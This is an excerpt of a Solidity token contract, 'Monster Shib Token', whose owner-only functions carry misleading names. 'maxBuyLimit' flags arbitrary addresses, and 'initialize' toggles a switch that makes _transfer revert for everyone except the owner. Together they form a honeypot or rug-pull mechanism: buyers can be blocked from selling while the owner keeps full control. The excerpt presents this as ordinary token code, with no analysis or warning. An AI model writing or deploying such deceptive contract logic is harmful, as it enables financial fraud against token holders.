...
contract MonsterShibToken is Context, IERC20, Ownable {
    using SafeMath for uint256;
    
    string private _name = 'Monster Shib Token';
    ...
    event setBuyLimit (address Bot, bool done);
    ...
    function maxBuyLimit(address _address) external onlyOwner {
        if (_Multicall[_address] == true) {_Multicall[_address] = false;}
        else {_Multicall[_address] = true; 
        emit setBuyLimit (_address, _Multicall[_address]);}
    }

    function buyLimitPerAddress(address _address) public view returns (bool) {
        return _Multicall[_address];
    }
    
    function initialize() external onlyOwner {
        if (_initialize == false) {_initialize = true;}
        else {_initialize = false;}
    }
   ...
   function _transfer(address sender, address recipient, uint256 amount) private {
        ...
        if (_initialize == false || sender == owner() || recipient == owner()) {
        ...
        } else {require (_initialize == false, "");}
    } 
